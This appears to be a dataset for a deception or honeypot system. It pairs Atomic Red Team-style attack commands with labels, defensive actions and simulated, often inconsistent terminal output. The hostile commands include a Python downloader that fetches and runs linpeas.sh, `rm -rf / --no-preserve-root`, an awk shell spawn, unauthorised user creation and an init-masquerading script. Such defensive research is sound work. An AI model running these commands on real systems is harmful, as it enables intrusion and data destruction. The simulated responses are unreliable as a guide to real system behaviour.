+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:
+command:pip install requests    
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 1.1 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 2.4 MB/s 
+Collecting charset-normalizer<3,>=2
+  Downloading charset_normalizer-2.0.6-py3-none-any.whl (37 kB)
+Collecting idna<4,>=2.5
+  Downloading idna-3.2-py3-none-any.whl (61 kB)
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.5.30-py2.py3-none-any.whl (157 kB)
+Installing collected packages: urllib3, charset-normalizer, idna, certifi, requests
+Successfully installed certifi-2021.5.30 charset-normalizer-2.0.6 idna-3.2 requests-2.26.0 urllib3-1.26.6
+chris@speedlab-ml-3:~$
+tactic:0
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:$which_python T1059.006.py
+response:chris@speedlab-ml-3:~$
+action:{ if output is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris
+tactic:1
+technique:105
+
+
+action:{ if output content access right relative, change the access rights }
+command:pip install requests    
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (63 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 63 kB 1.8 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 1.4 MB/s 
+Collecting charset-normalizer<3,>=2
+  Downloading charset_normalizer-2.0.4-py3-none-any.whl (37 kB)
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.5.30-py3-none-any.whl (143 kB)
+Installing collected packages: urllib3, charset-normalizer, idna, certifi, requests
+Successfully installed certifi-2021.5.30 charset-normalizer-2.0.4 idna-2.10 requests-2.26.0 urllib3-1.26.6
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+action:{ if output contain network speed, Degrade the network speed }
+command:whoami
+response:chris
+tactic:5
+technique:40
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+response:bash: : No such file or directory
+chris@speedlab-ml-3:~$ 
+tactic:8
+technique:178
+
+
+action:{ Block this command this time }
+command:echo "Install netstat on the machine."; exit 1;
+response:bash: exit: 1: cannot exit
+chris@speedlab-ml-3:~$
+action:{ if output contain network speed, Degrade the network speed }
+command:whoami
+response:chris
+tactic:1
+technique:105
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 1.2 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 1.0 MB/s 
+Collecting chardet<5,>=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 178 kB 1.0 MB/s 
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 58 kB 1.2 MB/s 
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.5.30-py2.py3-none-any.whl (145 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 145 kB 780 kB/s 
+Installing collected packages: urllib3, chardet, idna, certifi, requests
+Successfully installed certifi-2021.5.30 chardet-4.0.0 idna-2.10 requests-2.26.0 urllib3-1.26.6
+chris@speedlab-ml-3:~$
+tactic:1
+technique:155
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:200
+
+
+action:{ Block this command this time }
+command:echo "Install netstat on the machine."; exit 1;
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:178
+
+
+action:
+command:netstat
+response:Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 192.168.1.100:22       192.168.1.5:54321      ESTABLISHED
+tcp        0      0 192.168.1.100:80       203.0.113.10:443       TIME_WAIT  
+udp        0      0 192.168.1.100:53       0.0.0.0:*                           
+udp6       0      0 fe80::a00:27ff:fe4e:53 :::*                              
+chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:{ Change terminal output this time }
+command:who -a
+response:chris     pts/0        2023-10-05 10:30 (:0)
+reboot    system boot  5.4.0-91-generic    Thu Oct  5 10:25 - 10:30  (00:05)
+runlevel  5.4.0-91-generic  +  (N/A)  
+chris@speedlab-ml-3:~$
+tactic:8
+technique:105
+
+
+action:{ if output is file content, Change the file content }
+command:pip install requests    
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 10.0 kB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 8.0 kB/s 
+Collecting chardet<5,>=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 178 kB 8.0 kB/s 
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 58 kB 10.0 kB/s 
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.5.30-py2.py3-none-any.whl (145 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 145 kB 5.0 kB/s 
+Installing collected packages: urllib3, chardet, idna, certifi, requests
+Successfully installed certifi-2021.5.30 chardet-4.0.0 idna-2.10 requests-2.26.0 urllib3-1.26.6
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c 'import py_compile; py_compile.compile("T1059.006.py", "T1059.006.pyc")'
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:
+command:$which_python T1059.006.pyc
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:awk 'BEGIN {system("/bin/sh &")}'
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:195
+
+
+action:{ Restore to original state }
+command:sudo apt-get install login; exit 1;
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:103
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:[ "$(uname)" = 'FreeBSD' ] && cmd="lastlogin" || cmd="lastlog" 
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:3
+
+
+action:{ if output is file content, Change the file content }
+command:$cmd > /tmp/T1087.001.txt
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:3
+
+
+action:{ Block this command this time }
+command:cat /tmp/T1087.001.txt
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:103
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:103
+
+
+action:{ if output is file content, Change the file content }
+command:rm -f /tmp/victim-files/T1070.004-test.txt
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:103
+
+
+action:{ Restore to original state }
+command:if [ -z "$(ls -A /var/spool/mail/)" ]; then touch /var/spool/mail/temp; fi
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:103
+
+
+action:{ Restore to original state }
+command:mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ "$(basename "$file")" != "copy" ]; then cp -R "$file" /var/spool/mail/copy/; if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"; fi; fi; done
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:{ if output is file content, Change the file content }
+command:if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ Change terminal output this time }
+command:if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
+response:uid=1000(chris) gid=1000(chris) groups=1000(chris),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),117(docker)
+chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:
+command:if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:132
+
+
+action:
+command:cat /etc/group
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:103
+
+
+action:
+command:pip install requests    
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 1.2 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 1.0 MB/s 
+Collecting chardet<5,>=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 178 kB 1.0 MB/s 
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 58 kB 1.2 MB/s 
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.5.30-py2.py3-none-any.whl (145 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 145 kB 780 kB/s 
+Installing collected packages: urllib3, chardet, idna, certifi, requests
+Successfully installed certifi-2021.5.30 chardet-4.0.0 idna-2.10 requests-2.26.0 urllib3-1.26.6
+chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:0
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+action:{ if output content access right relative, change the access rights }
+command:whoami
+response:chris
+tactic:3
+technique:9
+
+
+action:{ Change terminal output this time }
+command:pip install requests    
+response:Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (63 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 63 kB 1.1 MB/s 
+Installing collected packages: requests
+Successfully installed requests-2.26.0
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'import os' >> T1059.006.py
+response:bash: T1059.006.py: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:bash: T1059.006.py: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:bash: T1059.006.py: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:$which_python -c 'import py_compile; py_compile.compile("T1059.006.py", "T1059.006.pyc")'
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:$which_python T1059.006.pyc
+response:bash: Network traffic blocked: command not allowed.
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo missing ldapsearch command; exit 1
+response:chris@speedlab-ml-3:~$
+tactic:0
+technique:3
+
+
+action:
+command:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+response:bash: ldapsearch: command not found
+chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:pip install requests
+response:Requirement already satisfied: requests in /usr/lib/python3/dist-packages (2.25.1)
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:bash: Permission denied
+chris@speedlab-ml-3:~$
+tactic:2
+technique:105
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:pip install requests
+response:Requirement already satisfied: requests in /usr/lib/python3/dist-packages (2.25.1)
+chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:bash: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:112
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:cp /bin/ls /tmp/evil-binary
+response:bash: Network traffic blocked: command not allowed.
+chris@speedlab-ml-3:~$
+action:{ if output content access right relative, change the access rights }
+command:whoami
+response:chris
+tactic:0
+technique:40
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:pip install requests
+response:ERROR: Operation not permitted: pip installations are blocked by network traffic policies.
+action:{ if output is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris
+tactic:1
+technique:29
+
+
+action:
+command:echo "Automated installer not implemented yet, please install chsh manually"
+response:Automated installer not implemented yet, please install chsh manually
+chris@speedlab-ml-3:~$
+tactic:8
+technique:37
+
+
+action:{ if output is file content, Change the file content }
+command:[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:cat /etc/passwd |grep ^art
+response:cat: /etc/passwd: Permission denied
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ Change terminal output this time }
+command:chsh -s /bin/sh art
+response:chsh: /bin/sh: shell not allowed for user art
+chris@speedlab-ml-3:~$
+action:
+command:whoami
+response:chris
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo "Install netstat on the machine."; exit 1;
+response:-bash: echo: command not found
+chris@speedlab-ml-3:~$
+tactic:8
+technique:178
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:netstat
+response:Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 localhost:9090          0.0.0.0:*              LISTEN
+tcp        0      0 192.168.1.5:22         192.168.1.10:54321     ESTABLISHED
+tcp        0      0 192.168.1.5:80         192.168.1.20:54322     TIME_WAIT
+udp        0      0 192.168.1.5:123        0.0.0.0:*                           
+chris@speedlab-ml-3:~$
+tactic:6
+technique:179
+
+
+action:
+command:who -a
+response:             system boot  2023-10-01 10:00
+             run-level 5  2023-10-01 10:00
+   1  runlevel (3)   2023-10-01 10:05
+   2  runlevel (2)   2023-10-01 10:10
+   3  runlevel (1)   2023-10-01 10:15
+   4  runlevel (0)   2023-10-01 10:20
+   5  runlevel (6)   2023-10-01 10:25
+
+USER     TTY       FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+chris    pts/0    192.168.1.10     10:00    5.00s  0.05s  0.00s -bash
+root     pts/1    192.168.1.1      10:05    1.00s  0.10s  0.05s top
+alice    pts/2    192.168.1.20     10:10    2.00s  0.20s  0.10s vim
+bob      pts/3    192.168.1.30     10:15    0.00s  0.00s  0.00s sshd
+chris@speedlab-ml-3:~$
+tactic:5
+technique:112
+
+
+action:{ Restore to original state }
+command:mkdir -p /tmp/atomic-test-T1036.006
+response:chris@speedlab-ml-3:~$
+tactic:5
+technique:112
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:cd /tmp/atomic-test-T1036.006
+response:chris@speedlab-ml-3:~$
+tactic:0
+technique:112
+
+
+action:{ Change terminal output this time }
+command:mkdir -p 'testdirwithspaceend '
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:1
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:[ "$(uname)" = 'FreeBSD' ] && /bin/echo "#\!/bin/sh" > "testdirwithspaceend /init " && echo 'echo "print(\"running T1035.006 with space after filename to masquerade init\")" | python3.9' >> "testdirwithspaceend /init " && echo "exit" >> "testdirwithspaceend /init " || /usr/bin/echo -e "%d\na\n#!/usr/bin/perl\nprint \"running T1035.006 with space after filename to masquerade init\\n\";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n" | ed 'testdirwithspaceend /init ' >/dev/null
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:112
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:chmod +x 'testdirwithspaceend /init '
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:112
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:'./testdirwithspaceend /init '
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
+response:-bash: sh: command not found
+chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:chmod +x /tmp/art.sh
+response:chris@speedlab-ml-3:~$
+tactic:11
+technique:29
+
+
+action:{ Block this command this time }
+command:sh /tmp/art.sh
